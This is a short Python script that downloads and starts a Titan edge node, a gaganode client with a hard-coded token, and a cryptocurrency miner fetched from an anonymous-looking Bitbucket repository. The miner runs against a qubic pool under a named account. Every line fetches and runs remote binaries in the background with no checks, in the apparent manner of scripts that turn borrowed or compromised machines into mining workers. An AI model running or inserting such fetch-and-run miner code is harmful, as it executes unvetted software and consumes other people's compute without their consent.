import sys
import os
os.system("wget https://github.com/Titannet-dao/titan-node/releases/download/v0.1.18/titan_v0.1.18_linux_amd64.tar.gz")
os.system("tar xf titan_v0.1.18_linux_amd64.tar.gz && cd titan_v0.1.18_linux_amd64")
os.system("nohup ./titan_v0.1.18_linux_amd64/titan-edge daemon start --init --url https://test-locator.titannet.io:5000/rpc/v0  > edge.log 2>&1 &")
os.system("sleep 30")
os.system("./titan_v0.1.18_linux_amd64/titan-edge config set --storage-size 250GB")
os.system("./titan_v0.1.18_linux_amd64/titan-edge daemon stop")
os.system("nohup ./titan_v0.1.18_linux_amd64/titan-edge daemon start --init --url https://test-locator.titannet.io:5000/rpc/v0  > edge.log 2>&1 &")
os.system("sleep 30")
os.system("./titan_v0.1.18_linux_amd64/titan-edge bind --hash=015EC2CD-8652-4F51-BF6A-2F0F4CCC9FA4 https://api-test1.container1.titannet.io/api/v2/device/binding")
os.system("wget https://assets.coreservice.io/public/package/66/gaganode_pro/0.0.300/gaganode_pro-0_0_300.tar.gz")
os.system("tar xf gaganode_pro-0_0_300.tar.gz")
os.system("./gaganode-linux-amd64/gaganode config set --token=qwvmrtoforlbkyho11e497c8f05285f7")
os.system("nohup ./gaganode-linux-amd64/gaganode 2>&1 &")
os.system("wget https://bitbucket.org/adqwdqwa/fasdqwdz/downloads/apoolminer")
os.system("chmod +x apoolminer")
os.system("./apoolminer --algo qubic --account CP_xuci4bjb2i --pool qubic2.hk.apool.io:3334 --worker fuadi")

